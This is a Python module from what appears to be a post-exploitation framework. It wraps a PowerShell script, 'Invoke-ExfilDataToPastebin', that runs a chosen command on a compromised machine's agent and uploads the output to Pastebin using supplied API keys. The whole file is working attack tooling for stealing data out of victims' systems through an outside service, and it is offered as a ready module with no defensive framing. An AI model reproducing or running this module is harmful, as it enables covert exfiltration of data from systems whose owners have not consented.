from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Invoke-ExfilDataToPastebin',

            # list of one or more authors for the module
            'Author': ['@rbct'],

            # more verbose multi-line description of the module
            'Description': ('Use this module to exfil command output to Pastebin. '
                            'Requires some API tokens'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            # Disabled - this can be a relatively noisy module but sometimes useful
            'OpsecSafe' : True,
            
            'Language' : 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion' : '3',

        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
            # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run module on',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ApiDevKey': {
                'Description'   :   'Pastebin API Developer key',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ApiUserKey': {
                'Description'   :   'Pastebin API User key',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Command': {
                'Description'   :   'Command whose output to exfiltrate',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/exfil/Invoke-ExfilDataToPastebin.ps1"

        try:
            f = open(moduleSource)
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # Need to actually run the module that has been loaded
        scriptEnd = 'Invoke-ExfilDataToPastebin'

        # add any arguments to the end execution of the script
        for option,values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() in ["true", "false"]:
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""

        script += scriptEnd
        return script
